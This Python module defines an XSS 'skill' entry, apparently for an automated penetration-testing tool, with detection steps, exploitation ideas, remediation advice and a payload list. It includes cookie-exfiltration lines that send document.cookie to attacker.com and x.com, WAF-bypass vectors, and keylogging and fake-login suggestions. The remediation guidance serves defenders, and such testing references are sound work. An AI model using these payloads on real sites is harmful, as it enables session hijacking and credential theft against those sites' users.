"""Cross-Site Scripting (XSS) - Reflected, Stored, DOM-based."""

SKILL = {
    "id": "xss",
    "name": "Cross-Site Scripting (XSS)",
    "category": "web",
    "severity": "high",

    "detection": """
- Test all input fields that reflect content back in the page
- Inject basic payloads: <script>alert(1)</script> in every parameter
- Check URL params, search boxes, comment fields, profile names, file upload names
- Test for reflected XSS: input appears in response HTML without encoding
- Test for stored XSS: input is saved and shown to other users
- Test for DOM XSS: check client-side JS that uses location.hash, document.URL, innerHTML
- Check if WAF blocks <script>: try bypasses with <img onerror=>, <svg onload=>, event handlers
- Test in HTTP headers: inject in Referer, User-Agent if reflected in logs/admin panel
- Check JSON responses for unescaped user input
- Test markdown/rich text editors for HTML injection
""",

    "exploitation": """
- Steal cookies: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
- Session hijacking: capture auth tokens from cookies or localStorage
- Keylogging: inject JS that captures keystrokes on login forms
- Phishing: inject fake login form that sends credentials to attacker
- For proof-of-concept: use <script>alert(document.domain)</script> to show execution
- For stored XSS: demonstrate that payload persists and fires for other users
- Capture: screenshot of alert box with domain, or HTTP request log showing stolen cookie
- DOM XSS: show the vulnerable JS code path and payload URL
""",

    "remediation": """
- IMMEDIATE: HTML-encode all output: &lt; &gt; &amp; &quot; &#x27;
  Python/Jinja2: {{ user_input | e }} (auto-escape)
  Node.js: Use DOMPurify or he.encode()
  React: JSX auto-escapes by default, avoid dangerouslySetInnerHTML
- Set Content-Security-Policy header: script-src 'self'; object-src 'none'
- Set HttpOnly flag on session cookies (prevents JS access)
- Set SameSite=Strict on cookies
- Use X-Content-Type-Options: nosniff
- Input validation: strip HTML tags where rich text is not needed
- For rich text: use allowlist of safe HTML tags (b, i, p, br only)
- SSH fix: Add CSP header in nginx: add_header Content-Security-Policy "default-src 'self'"
- SSH fix: Add HttpOnly to cookies in app config
- Verify: inject payloads again, confirm they are encoded in response
""",

    "tools": ["http_headers_check", "web_spider", "waf_detect"],

    "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "<img src=x onerror=fetch('https://x.com/'+document.cookie)>",
        "{{7*7}}", "${7*7}",
    ],

    "references": [
        "OWASP A03:2021 - Injection",
        "CWE-79: Cross-site Scripting",
        "CAPEC-86: XSS Through HTTP Headers",
    ],
}
